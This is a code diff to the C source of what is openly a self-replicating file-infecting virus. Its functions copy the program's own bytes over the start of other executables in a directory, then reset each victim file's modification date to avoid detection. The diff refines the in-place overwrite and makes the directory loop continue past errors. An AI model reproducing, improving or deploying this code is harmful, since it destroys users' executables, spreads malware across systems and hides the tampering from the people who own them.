@@ -6,7 +6,7 @@
 #include "weakcrypt.h"
 #include "clonelib.h"
 
-unsigned int getOwnBytes(char** bytes, const char* arg0){	
+int64_t getOwnBytes(char** bytes, const char* arg0){	
 	//Get name of executable
 	char* execname;
 	#ifdef _WIN32
@@ -29,12 +29,25 @@ unsigned int getOwnBytes(char** bytes, const char* arg0){
 	
 	//Check filesize
 	fseek(self_fp,0,SEEK_END);
-	unsigned int size=ftell(self_fp);
+	int64_t size=ftell(self_fp);
 	fseek(self_fp,0,SEEK_SET);
 	
 	//Get own bytes
 	*bytes=(char*)malloc(sizeof(char)*size);
 	fread(*bytes,1,size,self_fp);
+	
+	//Check for marker
+	bool c;
+	for(int64_t i=0;i<size-3;i++){
+		for(int j=0;j<END_MARKER_SIZE;j++)
+			c*=(*bytes)[i+j]==END_MARKER[END_MARKER_SIZE-1-j];
+		if(c){
+			printf("Found marker at %i\n",(int)i);
+			size=i+3;
+			break;
+		}
+		c=1;
+	}
 	
 	//Clean up
 	fclose(self_fp);
@@ -45,53 +58,26 @@ unsigned int getOwnBytes(char** bytes, const char* arg0){
 }
 
 
-bool infectTarget(const char* target, const char* malcode, unsigned int malsize){
-	/*This function can be reduced and sped up bytes
-	not reading from the target file and blindly replacing
-	bytes*/
+bool infectTarget(const char* target, const char* malbytes, const int64_t malsize){
 	//Get target modify date
 	int64_t tardate=getFileModifiedDate(target);
 	
-	//Open target file
-	FILE* tarfile=fopen(target,"rb");
-	if(tarfile==NULL)return 0;
-	
-	//Get target file size
-	fseek(tarfile,0,SEEK_END);
-	unsigned int tarsize=ftell(tarfile);
-	fseek(tarfile,0,SEEK_SET);
-	
-	//Read target file
-	char* tarcode=(char*)malloc(sizeof(char)*tarsize);
-	fread(tarcode,1,tarsize,tarfile);
-	fclose(tarfile);
-	
-	
-	//Limit executable size
-	/*FIXME: Code transfer size should be limited dynamically,
-	not statically*/
-	malsize=(malsize>MAX_EXEC_SIZE)?MAX_EXEC_SIZE:malsize;
-	
 	//Open target for cloning
-	tarfile=fopen(target,"wb");
+	FILE* tarfile=fopen(target,"r+b");//must be r+, 'w' will overwrite
 	if(tarfile==NULL)return 0;
 
-	
-	//Clone to target
-	for(unsigned int i=0;i<malsize;i++){fprintf(tarfile,"%c",malcode[i]);}
-	
-	//Fill with original bytes and close
-	if(tarsize>malsize){
-		for(unsigned int i=0;i<(tarsize-malsize);i++)
-			fprintf(tarfile,"%c",tarcode[malsize+i]);
+	//Clone (replace first few bytes)
+	printf("Writing bytes\n");
+	if(fwrite(malbytes,1,malsize,tarfile)!=(unsigned long)malsize){
+		fprintf(stderr,"Error: infectTarget: cloning failed\n");
+		return 0;
 	}
 	fclose(tarfile);
 	
 	//Reset modify date
+	printf("Setting modified date\n");
 	setFileModifiedDate(target,tardate);
 	
-	//Free memory and return
-	free(tarcode);
 	return 1;
 }
 
@@ -113,11 +99,11 @@ bool infectDirectory(const char* path, const char* arg0){
 				if(exectype->is_exec){	
 					printf("%s",ls[i]);
 					if(exectype->is_native ){
+						
 						//Copy own code
 						printf("(native)\n");
 						char* bytes;
-						unsigned int bytes_size=getOwnBytes(&bytes,arg0);
-						printf("%d",infectTarget(ls[i],bytes,bytes_size));
+						infectTarget(ls[i],bytes,getOwnBytes(&bytes,arg0));
 						free(bytes);
 						
 					}else if(CROSS_PLATFORM_ON){
@@ -134,7 +120,7 @@ bool infectDirectory(const char* path, const char* arg0){
 							
 						}else{
 							printf("Error(clonelib.c) - No platform\n");
-							return false;
+							continue;
 						}
 						
 						//Copy code from external binary
